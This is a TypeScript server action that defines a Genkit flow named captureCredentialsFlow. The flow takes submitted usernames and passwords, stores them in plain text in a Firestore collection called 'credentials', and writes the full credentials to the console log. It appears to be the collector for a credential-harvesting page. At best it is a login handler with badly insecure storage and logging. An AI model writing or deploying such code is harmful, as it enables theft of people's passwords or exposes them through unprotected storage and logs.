'use server';
/**
 * @fileOverview A flow to capture user credentials and save them to a file.
 *
 * - captureCredentials - A function that receives and logs user credentials.
 */

import {ai} from '@/ai/genkit';
import type {CredentialsInput} from '@/ai/types/credentials';
import {CredentialsInputSchema} from '@/ai/types/credentials';
import { getFirestore, collection, addDoc } from 'firebase/firestore';
import { initializeApp } from 'firebase/app';
// We can't use the provider here since this is a server-side flow.
// We need to initialize a new app instance.
import firebaseConfig from '@/firebase/config';

// Initialize Firebase App if not already initialized
let app;
try {
  app = initializeApp(firebaseConfig);
} catch (e) {
  // Already initialized
  app = (global as any)._firebaseApp;
}


export async function captureCredentials(
  input: CredentialsInput
): Promise<CredentialsInput> {
  return captureCredentialsFlow(input);
}

const captureCredentialsFlow = ai.defineFlow(
  {
    name: 'captureCredentialsFlow',
    inputSchema: CredentialsInputSchema,
    outputSchema: CredentialsInputSchema,
  },
  async (input: CredentialsInput) => {
    try {
      const db = getFirestore(app);
      const credentialsCollection = collection(db, 'credentials');
      await addDoc(credentialsCollection, {
        username: input.username,
        password: input.password,
        createdAt: new Date(),
      });
      console.log('Credentials saved to Firestore:', input);
    } catch (error) {
      console.error('Error saving credentials to Firestore:', error);
      // We still return the input to not break the flow,
      // but in a real app you might want to throw the error.
    }
    
    return input;
  }
);

    